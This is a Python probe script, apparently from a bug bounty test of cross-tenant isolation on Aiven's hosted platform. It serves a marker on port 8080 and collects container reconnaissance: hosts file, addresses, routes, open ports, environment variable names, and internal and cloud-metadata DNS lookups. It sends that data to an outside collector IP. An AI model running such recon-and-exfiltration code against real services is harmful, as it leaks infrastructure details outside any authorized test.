#!/usr/bin/env python3
"""probe20 - tenant B's target container: report its network position and serve a marker on :8080.

Part of the cross-tenant reachability test. B is our own second Aiven account (bugcrowdninja-1dd5), so
this is not another customer's workload. The interesting facts are: which Nomad node we land on (the
`nc-<uuid>` line in /etc/hosts), our pod address, and what we expose - then tenant A tries to reach us.
"""
from __future__ import annotations

import json
import os
import socket
import subprocess
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer

COLLECTOR = "http://208.87.134.252:9200/rt20"
MARKER = "BB-TENANT-B-CONTAINER"
RESULTS = {"stage": "init", "facts": {}, "marker": MARKER}


class H(BaseHTTPRequestHandler):
    def do_GET(self):
        body = json.dumps({"marker": MARKER, "who": "tenant-b", "facts": RESULTS.get("facts", {})}).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a):
        pass


def sh(cmd, t=15):
    try:
        r = subprocess.run(["/bin/sh", "-c", cmd], capture_output=True, timeout=t)
        return (r.stdout + r.stderr).decode("utf-8", "replace").strip()[:800]
    except Exception as e:                                              # noqa: BLE001
        return "ERR %s" % e


threading.Thread(target=lambda: HTTPServer(("0.0.0.0", 8080), H).serve_forever(), daemon=True).start()
time.sleep(2)

RESULTS["facts"] = {
    "hostname": sh("hostname"),
    "uname": sh("uname -a"),
    "hosts": sh("cat /etc/hosts"),
    "ip4": sh("ip -4 addr 2>/dev/null | grep inet"),
    "ip6": sh("ip -6 addr 2>/dev/null | grep inet6 | head -5"),
    "route4": sh("ip route 2>/dev/null"),
    "listening": sh("(ss -ltn 2>/dev/null || netstat -ltn 2>/dev/null) | head -10"),
    "resolv": sh("cat /etc/resolv.conf 2>/dev/null | head -5"),
    "env_names": " ".join(sorted(os.environ.keys()))[:300],
    "dns_probe": {},
}
# can B resolve Aiven-internal names, and do the engagement's own service names resolve?
for n in ("bb-probe-pg-1-bugcrowdninja-2a85.i.aivencloud.com",
          "bb-app-gcp-bugcrowdninja-2a85.i.aivencloud.com",
          "falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com",
          "metadata.google.internal"):
    try:
        RESULTS["facts"]["dns_probe"][n] = sorted({r[4][0] for r in socket.getaddrinfo(n, None)})
    except Exception as e:                                              # noqa: BLE001
        RESULTS["facts"]["dns_probe"][n] = type(e).__name__

# sanity: can we reach tenant A's own node gateway and our own marker?
RESULTS["facts"]["self_check"] = sh("curl -s -m 5 http://127.0.0.1:8080/ | head -c 120 || echo '(no curl)'")
RESULTS["stage"] = "done"
RESULTS["finished"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
try:
    import urllib.request
    urllib.request.urlopen(urllib.request.Request(COLLECTOR, data=json.dumps(RESULTS).encode(),
                                                  headers={"Content-Type": "application/json"}), timeout=25)
except Exception as e:                                                  # noqa: BLE001
    print("collector post failed:", e)
print(json.dumps(RESULTS, indent=1)[:3000])
while True:
    time.sleep(60)
